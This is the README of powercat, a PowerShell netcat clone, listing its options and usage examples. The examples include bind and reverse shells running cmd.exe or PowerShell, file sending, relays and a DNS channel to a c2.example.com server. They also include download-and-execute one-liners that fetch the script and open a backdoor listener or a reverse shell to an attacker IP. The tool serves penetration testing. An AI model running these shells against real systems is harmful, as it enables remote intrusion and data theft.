#powercat

Netcat: The powershell version. (Powershell Version 2 and Later Supported)

### Parameters:
    -l      Listen for a connection.                             [Switch]
    -c      Connect to a listener.                               [String]
    -p      The port to connect to, or listen on.                [String]
    -e      Execute. (GAPING_SECURITY_HOLE)                      [String]
    -ep     Execute Powershell.                                  [Switch]
    -r      Relay. Format: "-r tcp:10.1.1.1:443"                 [String]
    -u      Transfer data over UDP.                              [Switch]
    -dns    Transfer data over dns (dnscat2).                    [String]
    -dnsft  DNS Failure Threshold.                               [int32]
    -t      Timeout option. Default: 60                          [int32]
    -i      Input: Filepath (string), byte array, or string.     [object]
    -o      Output Type: "Host", "Bytes", or "String"            [String]
    -d      Disconnect after connecting.                         [Switch]
    -rep    Repeater. Restart after disconnecting.               [Switch]
    -h      Print the help message.                              [Switch]
### General Usage Examples:
    Listen and Connect:
        powercat -l 443
        powercat -c 10.1.1.10 443
    Serve and Send Shells:
        powercat -l -e cmd.exe 443
        powercat -c 10.1.1.10 -e cmd.exe 443
        powercat -l -ep 443
        powercat -c 10.1.1.10 -ep 443
    Output to a File:
        powercat -l -p 8000 -o "String" | Out-File C:\outputfile
        [IO.File]::WriteAllBytes("C:\outputfile",(powercat -l -p 8000 -o "Bytes"))
    Send a File:
        powercat -c 10.1.1.10 -p 443 -i "C:\inputfile"
        ([IO.File]::ReadAllBytes('C:\inputfile')) | powercat -c 10.1.1.10 -p 443
### powercat Relay Examples:
    Listener to Client Relay (TCP to TCP):
        powercat -l -p 8000 -r tcp:10.1.1.16:443
    Listener to Listener Relay (TCP to TCP):
        powercat -l -p 8000 -r tcp:4444
    Client to Listener Relay (TCP to TCP):
        powercat -c 10.1.1.16 -p 443 -r tcp:4444
    Client to Client Relay (TCP to TCP):
        powercat -c 10.1.1.16 -p 443 -r tcp:10.1.1.16:3389
    Listener to Client Relay (TCP to UDP):
        powercat -l -p 8000 -r udp:10.1.1.16:53
    Listener to Client Relay (TCP to DNS)
        powercat -l -p 8000 -r dns:10.1.1.1:53:c2.example.com
### Other Protocols
    Send a powershell shell out over UDP:
        powercat -c 10.1.1.16 -p 8000 -u -ep
    Send a shell to the dnscat2 server at c2.example.com, sending queries to 10.1.1.1
        powercat -c 10.1.1.1 -p 53 -dns c2.example.com -e cmd
### Misc Examples:
    Download and Execute Powercat Backdoor Listener One-Liner:
        powershell -c "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -l 8000 -e cmd.exe"
    Download and Execute Powercat Reverse Shell One-Liner (Replace <Attacker IP>):
        powershell -c "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c <ATTACKER IP> 443 -e cmd.exe"
    Basic TCP Port Scanner:
        (21,22,80,443) | % {powercat -c 10.1.1.10 -p $_ -t 1 -Verbose -d}
    Start A Persistent Server That Serves a File:
        powercat -l -p 443 -i C:\inputfile -rep